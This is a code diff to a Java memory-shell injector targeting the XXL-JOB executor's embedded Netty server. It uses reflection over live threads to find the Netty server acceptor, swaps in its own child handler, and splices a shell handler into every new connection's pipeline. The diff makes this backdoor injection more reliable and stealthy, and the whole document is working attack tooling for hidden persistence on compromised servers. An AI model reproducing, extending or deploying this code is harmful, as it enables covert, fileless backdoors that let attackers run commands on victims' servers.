@@ -1,13 +1,8 @@
 package com.reajason.javaweb.memshell.injector.xxljob;
 
-import com.xxl.job.core.biz.impl.ExecutorBizImpl;
-import com.xxl.job.core.server.EmbedServer;
 import io.netty.channel.ChannelHandler;
 import io.netty.channel.ChannelInitializer;
 import io.netty.channel.socket.SocketChannel;
-import io.netty.handler.codec.http.HttpObjectAggregator;
-import io.netty.handler.codec.http.HttpServerCodec;
-import io.netty.handler.timeout.IdleStateHandler;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -15,11 +10,8 @@ import java.io.IOException;
 import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.HashSet;
 import java.util.Set;
-import java.util.concurrent.LinkedBlockingQueue;
-import java.util.concurrent.ThreadPoolExecutor;
-import java.util.concurrent.TimeUnit;
+import java.util.UUID;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -43,8 +35,11 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
             return;
         }
         try {
-            inject();
-            msg += "[/*] ready\n";
+            if (inject()) {
+                msg += "[/*] ready\n";
+            } else {
+                msg += "failed, server channel not found\n";
+            }
         } catch (Throwable e) {
             msg += "failed " + getErrorMessage(e) + "\n";
         }
@@ -58,25 +53,28 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
     }
 
     private static Class<?> handlerClass;
+    private static ChannelHandler originalChildHandler;
+    private final String handlerName = UUID.randomUUID().toString();
 
     @Override
     protected void initChannel(SocketChannel channel) throws Exception {
+        if (channel.pipeline().get(handlerName) != null) {
+            return;
+        }
         ChannelHandler channelHandler = (ChannelHandler) handlerClass.newInstance();
-        channel.pipeline()
-                .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))
-                .addLast(new HttpServerCodec())
-                .addLast(new HttpObjectAggregator(5 * 1024 * 1024))
-                .addLast(channelHandler)
-                .addLast(new EmbedServer.EmbedHttpServerHandler(new ExecutorBizImpl(), "", new ThreadPoolExecutor(
-                        0,
-                        200,
-                        60L,
-                        TimeUnit.SECONDS,
-                        new LinkedBlockingQueue<>(2000),
-                        r -> new Thread(r, "xxl-rpc, EmbedServer bizThreadPool-" + r.hashCode()),
-                        (r, executor) -> {
-                            throw new RuntimeException("xxl-job, EmbedServer bizThreadPool is EXHAUSTED!");
-                        })));
+        channel.pipeline().addLast(originalChildHandler);
+        String httpCodecName = null;
+        for (String name : channel.pipeline().names()) {
+            if (name.contains("HttpObjectAggregator")) {
+                httpCodecName = name;
+                break;
+            }
+        }
+        if (httpCodecName != null) {
+            channel.pipeline().addAfter(httpCodecName, handlerName, channelHandler);
+        } else {
+            channel.pipeline().addFirst(handlerName, channelHandler);
+        }
     }
 
     private Class<?> getShellClass(Object context) throws Exception {
@@ -91,28 +89,50 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
         }
     }
 
-    public void inject() throws Exception {
+    public boolean inject() throws Exception {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread != null && thread.getName().contains("nioEventLoopGroup")) {
                 Object target;
                 try {
-                    target = getFieldValue(getFieldValue(getFieldValue(thread, "target"), "runnable"), "val$eventExecutor");
+                    Object innerRunnable = getFieldValue(getFieldValue(thread, "target"), "runnable");
+                    Field evField = getField(innerRunnable.getClass(), "val$eventExecutor");
+                    if (evField == null) {
+                        evField = getField(innerRunnable.getClass(), "this$0");
+                    }
+                    if (evField == null) {
+                        continue;
+                    }
+                    target = evField.get(innerRunnable);
                     if (target.getClass().getName().endsWith("NioEventLoop")) {
-                        HashSet<?> set = (HashSet<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
-                        if (!set.isEmpty()) {
-                            Object keys = set.toArray()[0];
-                            Object pipeline = getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
-                            Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
-                            handlerClass = getShellClass(embedHttpServerHandler);
-                            setFieldValue(embedHttpServerHandler, "childHandler", this);
-                            return;
+                        Set<?> set = (Set<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
+                        for (Object key : set.toArray()) {
+                            try {
+                                Object pipeline = getFieldValue(((java.nio.channels.SelectionKey) key).attachment(), "pipeline");
+                                Object tail = getFieldValue(pipeline, "tail");
+                                Object prevContext = getFieldValue(tail, "prev");
+                                Object acceptor = getFieldValue(prevContext, "handler");
+                                if (acceptor == null || !acceptor.getClass().getName().contains("ServerBootstrapAcceptor")) {
+                                    continue;
+                                }
+                                Field childHandlerField = getField(acceptor.getClass(), "childHandler");
+                                if (childHandlerField == null) {
+                                    continue;
+                                }
+                                childHandlerField.setAccessible(true);
+                                originalChildHandler = (ChannelHandler) childHandlerField.get(acceptor);
+                                handlerClass = getShellClass(acceptor);
+                                childHandlerField.set(acceptor, this);
+                                return true;
+                            } catch (Exception ignored) {
+                            }
                         }
                     }
                 } catch (Exception ignored) {
                 }
             }
         }
+        return false;
     }
 
     @SuppressWarnings("all")
